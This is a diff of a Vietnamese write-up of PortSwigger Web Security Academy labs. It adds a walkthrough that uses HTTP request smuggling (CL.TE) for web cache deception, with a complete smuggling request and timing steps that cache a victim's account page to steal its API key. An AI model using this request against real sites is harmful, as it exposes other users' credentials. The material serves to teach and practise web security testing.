@@ -619,7 +619,34 @@ Vào exploit server, cấu hình javascript với content `alert(document.cookie
 ![image](https://user-images.githubusercontent.com/103978452/226513945-a8d1dce6-254e-41a6-98f2-3551274d399d.png)
 
 Làm các bước như trên, kết quả thành công.
+
 # 17. Exploiting HTTP request smuggling to perform web cache deception
+Website có lỗi CL.TE. Nhận thấy:
++) Response của request `GET /my-account` có chứa apiKey
++) Request `GET /resources/js/tracking.js` có sử dụng cache
+
+Cấu hình request (1):
+```
+POST / HTTP/1.1
+Host: 0a550057037bf777c4ce9e1b00cc00f2.web-security-academy.net
+Content-Length: 37
+Transfer-Encoding: chunked
+
+0
+
+GET /my-account HTTP/1.1
+Foo: x
+```
+Request trên sẽ khai thác HRS, smuggled request sẽ trả về response chứa apiKey.
+
+Ta có thể exploit theo các bước sau:
+1) Đợi đến khi cache hết hạn và đợi đến khi user gửi request tới home page, nhưng chưa kịp gửi request đến file tracking.js. Khi đó, ta gửi request (1), smuggled request sẽ khiến request tiếp theo gửi đến server trở thành `GET /my-account`.
+2) Khi browser của victim gửi request `GET /resources/js/tracking.js`, server sẽ xử lý smuggled request với credentials của victim. Sau đó, response được lưu vào trong cache.
+3) Ta gửi request `/resources/js/tracking.js` để kiểm tra kết quả, nếu thành công thì response sẽ trả về trang "My account" của victim.
+
+![image](https://user-images.githubusercontent.com/103978452/226516072-ba764fed-e6de-4823-93fa-1ac53fbf2798.png)
+
+Thử lặp lại các bước trên một vài lần, kết quả bài lab được giải thành công.
 
 # 18. Bypassing access controls via HTTP/2 request tunnelling
 
